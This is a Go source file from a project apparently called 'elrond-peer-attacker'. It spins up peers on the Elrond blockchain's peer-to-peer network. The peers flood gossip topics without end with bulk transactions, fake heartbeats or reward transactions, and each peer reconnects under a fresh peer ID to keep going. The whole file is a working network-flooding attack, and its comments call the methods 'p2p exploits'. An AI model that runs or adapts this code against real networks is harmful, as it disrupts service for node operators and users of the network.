package p2p

import (
	"fmt"
	"math/rand"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/ElrondNetwork/elrond-go/config"
	"github.com/ElrondNetwork/elrond-go/display"
	"github.com/ElrondNetwork/elrond-go/node"
	"github.com/ElrondNetwork/elrond-go/p2p"
	"github.com/ElrondNetwork/elrond-go/p2p/libp2p"
	epa_libp2p "github.com/SebastianJ/elrond-peer-attacker/p2p/elrond/libp2p"
	"github.com/SebastianJ/elrond-peer-attacker/utils"
	sdkAPI "github.com/SebastianJ/elrond-sdk/api"
	sdkWallet "github.com/SebastianJ/elrond-sdk/wallet"
)

// StartPeers - starts the required p2p peers
func StartPeers() error {
	fmt.Println("Starting new peer....")

	// Refactor this later - all of the various p2p exploits should have entirely separate starting points etc
	for _, wallet := range Configuration.Account.Wallets {
		go StartPeer(wallet)
	}

	return nil
}

// StartPeer - starts a new peer and starts sending transactions
func StartPeer(wallet sdkWallet.Wallet) error {
	messenger, err := createNode(*Configuration.P2P.ElrondConfig)
	if err != nil {
		return err
	}

	err = messenger.Bootstrap()
	if err != nil {
		return err
	}

	fmt.Printf("Sleeping %d seconds to let the peer connect to other peers\n", Configuration.P2P.ConnectionWait)
	time.Sleep(time.Second * time.Duration(Configuration.P2P.ConnectionWait))

	subscribeToTopics(messenger)
	displayMessengerInfo(messenger)
	round := 0

	for {
		if Configuration.P2P.Rotation > 0 && round >= Configuration.P2P.Rotation {
			break
		}

		switch Configuration.P2P.Method {
		case "txs", "transaction", "transactions":
			GenerateAndBulkSendTransactions(messenger, wallet)
		case "hb", "heartbeat", "heartbeats":
			BulkSendHeartbeats(messenger)
		case "reward", "rewards":
			BulkSendRewardTxs(messenger, wallet)
		default:
			GenerateAndBulkSendTransactions(messenger, wallet)
		}

		/*select {
		case <-time.After(time.Second * 10):
			subscribeToTopics(messenger)
			displayMessengerInfo(messenger)
		}*/

		round++
	}

	messenger.Close()

	// Do it all over again - this time with a new peer / p2p id
	StartPeer(wallet)

	return nil
}

func subscribeToTopics(messenger p2p.Messenger) {
	for _, topic := range Configuration.P2P.Topics {
		if !messenger.HasTopic(topic) {
			messenger.CreateTopic(topic, true)
		}
	}
}

func broadcastMessage(messenger p2p.Messenger, wallet sdkWallet.Wallet, receiver string, nonce uint64) { //, waitGroup *sync.WaitGroup) {
	//defer waitGroup.Done()
	client := sdkAPI.Client{
		Host:                 utils.RandomizeAPIURL(),
		ForceAPINonceLookups: true,
	}
	client.Initialize()

	tx, err := generateTransaction(wallet, client, receiver, nonce)
	if err != nil {
		return
	}
	bytes, err := Configuration.P2P.TxMarshalizer.Marshal(tx.Transaction)

	/*bytes := randomizeData()
	var err error = nil*/

	if err != nil {
		fmt.Printf("Error occurred while generating transaction - error: %s\n", err.Error())
	} else {
		for _, topic := range Configuration.P2P.Topics {
			fmt.Printf("Sending message of %d bytes to topic/channel %s\n", len(bytes), topic)

			go messenger.BroadcastOnChannel(
				node.SendTransactionsPipe,
				topic,
				bytes,
			)
		}
	}
}

func randomizeData() []byte {
	randomNumber := rand.New(rand.NewSource(time.Now().UTC().UnixNano())).Intn(1000000)
	var message strings.Builder
	message.WriteString(Configuration.P2P.Data)
	message.WriteString(strconv.Itoa(randomNumber))
	bytes := []byte(message.String())

	return bytes
}

func randomizeShardID() uint32 {
	return utils.RandomElementFromUint32Slice(Configuration.P2P.ShardIDs)
}

func createNode(p2pConfig config.P2PConfig) (p2p.Messenger, error) {
	arg := epa_libp2p.ArgsNetworkMessenger{
		ListenAddress: libp2p.ListenAddrWithIp4AndTcp,
		P2pConfig:     p2pConfig,
	}

	return epa_libp2p.NewNetworkMessenger(arg)
}

func displayMessengerInfo(messenger p2p.Messenger) {
	headerSeedAddresses := []string{"Peer addresses:"}
	addresses := make([]*display.LineData, 0)

	for _, address := range messenger.Addresses() {
		addresses = append(addresses, display.NewLineData(false, []string{address}))
	}

	tbl, _ := display.CreateTableString(headerSeedAddresses, addresses)
	fmt.Println(tbl)

	mesConnectedAddrs := messenger.ConnectedAddresses()
	sort.Slice(mesConnectedAddrs, func(i, j int) bool {
		return strings.Compare(mesConnectedAddrs[i], mesConnectedAddrs[j]) < 0
	})

	headerConnectedAddresses := []string{fmt.Sprintf("Node is connected to %d peers:", len(mesConnectedAddrs))}
	connAddresses := make([]*display.LineData, len(mesConnectedAddrs))

	for idx, address := range mesConnectedAddrs {
		connAddresses[idx] = display.NewLineData(false, []string{address})
	}

	tbl2, _ := display.CreateTableString(headerConnectedAddresses, connAddresses)
	fmt.Println(tbl2)

	for _, topic := range Configuration.P2P.Topics {
		peers := messenger.ConnectedPeersOnTopic(topic)
		fmt.Printf("Connected peers on topic %s: %d\n\n", topic, len(peers))
	}
}
